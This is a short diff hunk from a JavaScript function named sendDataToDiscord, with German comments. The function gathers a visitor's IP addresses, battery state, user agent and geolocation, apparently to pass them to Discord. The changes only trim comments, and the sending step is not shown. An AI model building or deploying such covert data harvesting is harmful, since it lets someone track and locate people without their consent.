@@ -10,20 +10,20 @@ async function sendDataToDiscord() {
         const ipv6Data = await ipv6Response.json();
         const ipv6Address = ipv6Data.ip;
 
-        // Bevorzugt IPv4-Adresse
+        
         const addressToSend = ipv4Address || ipv6Address;
 
-        // Batteriestatus
+        // Batteriestat
         let batteryStatus = 'Batteriestatus konnte nicht abgefragt werden';
         if ('getBattery' in navigator) {
             const battery = await navigator.getBattery();
             batteryStatus = `Ladezustand: ${Math.round(battery.level * 100)}%, ${battery.charging ? 'Lädt' : 'Nicht ladend'}`;
         }
 
-        // Device-Info
+        // Device-Inf
         const deviceInfo = navigator.userAgent;
 
-        // Geolocation
+        // Geoloc
         let locationInfo = 'Geolocation konnte nicht abgefragt werden';
         let geolocationLink = '';
         if ('geolocation' in navigator) {
